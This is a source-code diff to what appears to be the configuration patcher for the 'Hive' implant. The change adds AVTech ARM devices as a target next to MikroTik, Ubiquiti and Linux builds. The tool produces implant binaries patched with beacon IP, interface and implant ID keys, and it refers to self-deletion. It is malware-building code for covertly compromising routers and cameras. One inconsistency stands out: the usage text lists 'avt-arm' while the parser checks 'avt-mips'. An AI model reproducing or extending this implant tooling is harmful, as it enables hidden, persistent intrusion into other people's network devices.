@@ -18,7 +18,7 @@
 #include "_unpatched_mikrotik_mips.h"
 #include "_unpatched_mikrotik_ppc.h"
 #include "_unpatched_ubiquiti_mips.h"
-
+#include "_unpatched_avtech_arm.h"
 #include "debug.h"
 #include "string_utils.h"
 #include "colors.h"
@@ -27,25 +27,27 @@
 #include "polarssl/config.h"
 #include "polarssl/sha1.h"
 
-//#define HIVE_SOLARIS_X86_FILE "hived-solaris-x86-PATCHED"
-#define HIVE_LINUX_X86_FILE "hived-linux-x86-PATCHED"
-#define HIVE_MIKROTIK_X86_FILE "hived-mikrotik-x86-PATCHED"
-#define HIVE_MIKROTIK_MIPS_FILE "hived-mikrotik-mips-PATCHED"
-//#define HIVE_MIKROTIK_MIPSEL_FILE "hived-mikrotik-mipsel-PATCHED"
-#define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"
-#define HIVE_UBIQUITI_MIPS_FILE "hived-ubiquiti-mips-PATCHED"
+//#define HIVE_SOLARIS_X86_FILE				"hived-solaris-x86-PATCHED"
+#define HIVE_LINUX_X86_FILE					"hived-linux-x86-PATCHED"
+#define HIVE_MIKROTIK_X86_FILE				"hived-mikrotik-x86-PATCHED"
+#define HIVE_MIKROTIK_MIPS_FILE				"hived-mikrotik-mips-PATCHED"
+//#define HIVE_MIKROTIK_MIPSEL_FILE			"hived-mikrotik-mipsel-PATCHED"
+#define HIVE_MIKROTIK_PPC_FILE				"hived-mikrotik-ppc-PATCHED"
+#define HIVE_UBIQUITI_MIPS_FILE				"hived-ubiquiti-mips-PATCHED"
+#define HIVE_AVTECH_ARM_FILE				"hived-avtech-arm-PATCHED"
 
-//#define HIVE_SOLARIS_X86_UNPATCHED "hived-solaris-x86-UNpatched"
-#define HIVE_LINUX_X86_UNPATCHED "hived-linux-x86-UNpatched"
-#define HIVE_MIKROTIK_X86_UNPATCHED "hived-mikrotik-x86-UNpatched"
-#define HIVE_MIKROTIK_MIPS_UNPATCHED "hived-mikrotik-mips-UNpatched"
-//#define HIVE_MIKROTIK_MIPSEL_UNPATCHED "hived-mikrotik-mipsel-UNpatched"
-#define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
-#define HIVE_UBIQUITI_MIPS_UNPATCHED "hived-ubiquiti-mips-UNpatched"
+//#define HIVE_SOLARIS_X86_UNPATCHED 		"hived-solaris-x86-UNpatched"
+#define HIVE_LINUX_X86_UNPATCHED			"hived-linux-x86-UNpatched"
+#define HIVE_MIKROTIK_X86_UNPATCHED			"hived-mikrotik-x86-UNpatched"
+#define HIVE_MIKROTIK_MIPS_UNPATCHED		"hived-mikrotik-mips-UNpatched"
+//#define HIVE_MIKROTIK_MIPSEL_UNPATCHED	"hived-mikrotik-mipsel-UNpatched"
+#define HIVE_MIKROTIK_PPC_UNPATCHED			"hived-mikrotik-ppc-UNpatched"
+#define HIVE_UBIQUITI_MIPS_UNPATCHED		"hived-ubiquiti-mips-UNpatched"
+#define HIVE_AVTECH_ARM_UNPATCHED			"hived-avtech-arm-UNpatched"
 
-#define ID_KEY_FILE	"ID-keys.txt"
+#define ID_KEY_FILE				"ID-keys.txt"
 #define ID_KEY_DATETIME_FORMAT	"%4i/%02i/%02i %02i:%02i:%02i"
-#define	SD_PATH_LENGTH	128		// This is also defined in server/self_delete.h
+#define	SD_PATH_LENGTH			128		// This is also defined in server/self_delete.h
 
 #define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH
 
@@ -133,12 +135,13 @@ int usage(char **argv)
 	fprintf(stdout, "                             * 'all' - default\n");
 	fprintf(stdout, "                             * 'raw' - all unpatched\n");
 	fprintf(stdout, "                             * 'mt-x86'\n");
-	fprintf(stdout, "                             * 'mt-mips' (or 'mt-mipsbe' (deprecated) )\n");
+	fprintf(stdout, "                             * 'mt-mips'\n");
 //	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
 	fprintf(stdout, "                             * 'mt-ppc'\n");
 	fprintf(stdout, "                             * 'linux-x86'\n");
-	fprintf(stdout, "                             * 'sol-x86'\n");
+//	fprintf(stdout, "                             * 'sol-x86'\n");
 	fprintf(stdout, "                             * 'ub-mips'\n");
+	fprintf(stdout, "                             * 'avt-arm'\n");
 	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
 //   fprintf(stdout, "  %sExamples:%s\n", BLUE, RESET);
 //   fprintf( stdout, "   Coming soon!\n\n" );
@@ -175,6 +178,7 @@ int main(int argc, char **argv)
 //	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
 	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
 	int ubiquiti_mips = 0;						// Ubiquiti MIPS Big Endian
+	int avtech_arm = 0;							// AVTech ARM
 	int raw = 0;								// unpatched versions
 	char *host = (char *) NULL;					// cached hostname for user confirmation message
 	FILE *implantIDFile;						// Used to save implant keys and subsequent sha1 hashes...
@@ -349,6 +353,7 @@ int main(int argc, char **argv)
 //				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
 //				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
 				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
+				if (OPTMATCH(optarg, "avt-mips"))	{avtech_arm = 1;		break;}
 				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}
 
 				if (OPTMATCH(optarg, "all"))		{linux_x86 = 1,
@@ -357,7 +362,9 @@ int main(int argc, char **argv)
 													mikrotik_mips = 1,
 //													mikrotik_mipsel = 1,
 													mikrotik_ppc = 1,
-													ubiquiti_mips = 1;		break;}
+													ubiquiti_mips = 1;
+													avtech_arm = 1;
+																			break;}
 				printf(" ERROR: Invalid architecture specified\n");
 				return -1;
 			} while (0);
@@ -421,14 +428,17 @@ int main(int argc, char **argv)
 				(mikrotik_x86 == 0) &&
 				(mikrotik_mips == 0) && (mikrotik_ppc == 0) &&
 //				(mikrotik_mipsel == 0) &&
-				(ubiquiti_mips == 0)) {	// no OS was selected, so default is to build all
-			linux_x86 = 1;
-//			solaris_x86 = 1;
-			mikrotik_x86 = 1;
-			mikrotik_mips = 1;
-//			mikrotik_mipsel = 1;
-			mikrotik_ppc = 1;
-			ubiquiti_mips = 1;
+				(ubiquiti_mips == 0) &&
+				(avtech_arm == 0)
+				) {	// no OS was selected, so default is to build all
+					linux_x86 = 1;
+//					solaris_x86 = 1;
+					mikrotik_x86 = 1;
+					mikrotik_mips = 1;
+//					mikrotik_mipsel = 1;
+					mikrotik_ppc = 1;
+					ubiquiti_mips = 1;
+					avtech_arm = 1;
 		}
 
 #if 0	// Solaris deprecated
@@ -500,6 +510,10 @@ int main(int argc, char **argv)
 		printf("   . Ubiquiti/MIPS\n");
 	}
 
+	if (avtech_arm == 1 || raw == 1) {
+		printf("   . AVTech/ARM\n");
+	}
+
 	if (raw == 0) {
 		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
 		cl_string((unsigned char *) args.iface, sizeof(args.iface));
@@ -513,6 +527,7 @@ int main(int argc, char **argv)
 //	remove(HIVE_MIKROTIK_MIPSEL_FILE);
 	remove(HIVE_MIKROTIK_PPC_FILE);
 	remove(HIVE_UBIQUITI_MIPS_FILE);
+	remove(HIVE_AVTECH_ARM_FILE);
 
 //	remove(HIVE_SOLARIS_X86_UNPATCHED);
 	remove(HIVE_LINUX_X86_UNPATCHED);
@@ -521,7 +536,7 @@ int main(int argc, char **argv)
 //	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
 	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
 	remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
-
+	remove(HIVE_AVTECH_ARM_UNPATCHED);
 
 	sleep(1);
 
@@ -536,6 +551,7 @@ int main(int argc, char **argv)
 		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
 		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
 		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
+		non_patch(HIVE_AVTECH_ARM_UNPATCHED, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len);
 	}
 // We start as Little Endian.  If the binary is detected as Big Endian, then the structure
 // is changed to Big Endian.  Since these changes are made in a global variable used by all
@@ -545,7 +561,7 @@ int main(int argc, char **argv)
 		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
 	}
 
-#if 0 // Solaris deprecated
+#if 0	// Solaris no longer supported
 	if (solaris_x86 == 1) {
 		patch(HIVE_SOLARIS_X86_FILE, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len, args);
 	}
@@ -555,9 +571,15 @@ int main(int argc, char **argv)
 		patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
 	}
 
-//	if (mikrotik_mipsel == 1) {
-//		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
-//	}
+	if (avtech_arm == 1) {
+		patch(HIVE_AVTECH_ARM_FILE, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len, args);
+	}
+
+#if 0	// MikroTik little-endian no longer supported
+	if (mikrotik_mipsel == 1) {
+		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
+	}
+#endif
 
 	if (mikrotik_ppc == 1) {
 		patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
